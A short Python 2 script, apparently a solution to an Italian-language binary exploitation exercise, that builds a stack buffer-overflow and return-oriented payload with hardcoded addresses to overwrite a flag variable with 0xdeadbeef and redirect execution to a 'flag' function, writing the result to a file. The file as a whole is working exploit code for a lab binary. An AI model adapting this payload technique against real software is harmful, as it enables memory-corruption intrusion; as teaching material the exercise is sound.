import os
import struct

#esercizio:
#stampare la stringa "you Win!!!" sempre sfruttando la vulnerabilita` definita all'interno della funzione vuln (get_input->vuln->flag)

#bisogna entrare in vuln tramite buf cambiare flagvalue con 0xdeadbeef poi chiamare flag

ret = 0x080481a4
slash = 0x0a

string = 0x0804a060
vuln = 0x804849b
flag = 0x804856b

flagvalue = 0x0804a18c

#con questa prima gets del buffer si cambia il valore di flag
payload = struct.pack("I", 0xdeadbeef)
payload += "A"*124
payload += struct.pack("I", flagvalue)
payload += struct.pack("B", 0x0a)
#payload += struct.pack("I", ret)

#poi bisogna aggiungere
payload1 = "AAAAAAAAAAabc"
payload1 += "D"*(148 - len(payload1))
#metto dentro l'indirizzo della stringa
payload1 += struct.pack("I", string)

payload1 += "F"*8
payload1 += struct.pack("I", vuln)

payload1 += struct.pack("I", flag)

payload += payload1

f = open("badfile-rop", "w")
f.write("%s" % payload)
f.close()

